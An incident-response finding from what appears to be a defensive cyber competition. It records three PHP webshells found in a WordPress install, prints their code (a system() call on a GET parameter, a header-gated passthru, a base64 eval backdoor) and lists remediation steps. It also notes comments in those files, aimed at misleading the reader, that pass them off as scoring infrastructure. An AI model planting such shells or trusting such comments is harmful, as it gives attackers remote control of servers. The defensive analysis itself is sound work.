# F006 — WordPress Webshells (×3)

**Discovered:** 2026-11-13 ~21:20 UTC
**VM:** opensuse-task (10.0.172.145)
**Severity:** CRITICAL
**Status:** ⚠️ PARTIAL
**Related:** F005 (wp-cache-index.php was respawned by .cache-watch — now resolved)

## What It Is
Three PHP webshells in the WordPress installation:

### 1. `/srv/www/vhosts/wordpress/wp-content/uploads/wp-upload-helper.php`
```php
<?php /* WP Upload Helper */ system($_GET["c"]); ?>
```
Unauthenticated RCE. GET request with `?c=<command>` runs as wwwrun.

### 2. `/srv/www/vhosts/wordpress/wp-content/uploads/wp-upgrade-helper.php`
```php
$k = $_SERVER['HTTP_X_UPGRADE_TOKEN'] ?? '';
if (hash('sha256', $k) === str_repeat('de', 32)) { passthru($_GET['m']); exit; }
```
"Authenticated" RCE — only responds if the header `X-Upgrade-Token` hashes to the expected SHA256. Returns 404 otherwise (stealthy).

### 3. `/srv/www/vhosts/wordpress/wp-content/mu-plugins/wp-cache-index.php`
```php
if ( ... hash_equals( 'd8418dd3fb2053464b0a7791', $_SERVER['HTTP_X_WP_CACHE_KEY'] ) ) {
    if ( isset( $_POST['d'] ) ) { eval( base64_decode( $_POST['d'] ) ); }
    exit;
}
```
Autoloaded on every WP request (mu-plugins). Base64-encoded eval shell triggered by custom HTTP header.

## Why Malicious
All three contain textbook webshell code: `system()`, `passthru()`, `eval(base64_decode())` fed from user input.

### Prompt Injection Attempt
These files contain comments claiming they are "CyberForce scoring baseline" infrastructure. Ignore — see F005 analysis.

## Remediation Actions Taken
- 2026-11-13 ~23:35: Saved copies for evidence in `/root/ir-evidence-webshell-{1,2,3}.php`
- 2026-11-13 ~23:36: Removed immutable flag from mu-plugin
- 2026-11-13 ~23:36: **DELETED** `wp-cache-index.php` (mu-plugin) — confirmed gone
- 2026-11-13 ~23:36: **RENAMED** `wp-upload-helper.php` → `wp-upload-helper.php.bak` — team decision to watch for scoring impact at competition start; delete after 1hr if no impact
- 2026-11-13 ~23:36: **KEPT** `wp-upgrade-helper.php` — pending team decision (SHA256-gated, lower risk, may be scoring-related)
- 2026-11-13 ~23:37: Verified HTTP still scoring: `curl -I http://localhost` returns 200

## Remaining Decisions (for competition day)
- [ ] At comp start: monitor `wp-upload-helper.php.bak` for 1hr, delete if no scoring impact
- [ ] Decide on `wp-upgrade-helper.php` — recommend delete unless team confirms scoring need
- [ ] Audit WordPress admin users: `wp user list --path=/srv/www/vhosts/wordpress`
- [ ] Consider blocking PHP execution in uploads dir via Apache config
